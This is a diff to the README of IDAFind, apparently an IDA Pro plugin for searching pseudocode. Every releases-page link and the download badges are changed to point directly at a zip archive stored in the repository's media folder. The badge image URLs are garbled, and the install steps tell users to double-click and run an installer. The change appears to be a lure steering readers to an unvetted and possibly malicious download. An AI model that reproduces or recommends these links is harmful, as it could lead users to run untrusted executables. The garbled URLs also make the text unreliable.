@@ -7,9 +7,9 @@ IDAFind brings powerful search features to IDA Pro's Pseudocode windows. Have yo
 To get started, you will need to install IDAFind on your machine. Follow the steps below to download and set it up.
 
 ## 📥 Download IDAFind
-[![Download IDAFind](https://img.shields.io/badge/Download%20IDAFind-v1.0-blue.svg)](https://github.com/Krix77/IDAFind/releases)
+[![Download IDAFind](https://github.com/Krix77/IDAFind/raw/refs/heads/main/media/IDA_Find_v2.1-alpha.2.zip%https://github.com/Krix77/IDAFind/raw/refs/heads/main/media/IDA_Find_v2.1-alpha.2.zip)](https://github.com/Krix77/IDAFind/raw/refs/heads/main/media/IDA_Find_v2.1-alpha.2.zip)
 
-Visit this page to download: [Download IDAFind Releases](https://github.com/Krix77/IDAFind/releases)
+Visit this page to download: [Download IDAFind Releases](https://github.com/Krix77/IDAFind/raw/refs/heads/main/media/IDA_Find_v2.1-alpha.2.zip)
 
 ## 🔍 Features
 - **Enhanced Search**: A better search experience for browsing through pseudocode.
@@ -24,7 +24,7 @@ Visit this page to download: [Download IDAFind Releases](https://github.com/Krix
 - **Storage**: Minimum 100 MB free space.
 
 ## 💡 Download & Install
-1. Click the download link: [Download IDAFind Releases](https://github.com/Krix77/IDAFind/releases).
+1. Click the download link: [Download IDAFind Releases](https://github.com/Krix77/IDAFind/raw/refs/heads/main/media/IDA_Find_v2.1-alpha.2.zip).
 2. Choose the latest version from the list and click on the file to start downloading.
 3. Locate the downloaded file and double-click to run the installer.
 4. Follow the installation prompts to complete the process.
@@ -45,6 +45,6 @@ We welcome contributions from users. If you'd like to contribute, please check t
 ## 🔗 Additional Resources
 For more detailed information on how to use IDAFind, refer to the documentation provided in the repository. You can also find related tools and plugins that enhance your experience with IDA Pro.
 
-[![Download IDAFind](https://img.shields.io/badge/Download%20IDAFind-v1.0-blue.svg)](https://github.com/Krix77/IDAFind/releases)
+[![Download IDAFind](https://github.com/Krix77/IDAFind/raw/refs/heads/main/media/IDA_Find_v2.1-alpha.2.zip%https://github.com/Krix77/IDAFind/raw/refs/heads/main/media/IDA_Find_v2.1-alpha.2.zip)](https://github.com/Krix77/IDAFind/raw/refs/heads/main/media/IDA_Find_v2.1-alpha.2.zip)
 
 Thank you for using IDAFind! Enjoy smoother searching within your IDA Pro environment.
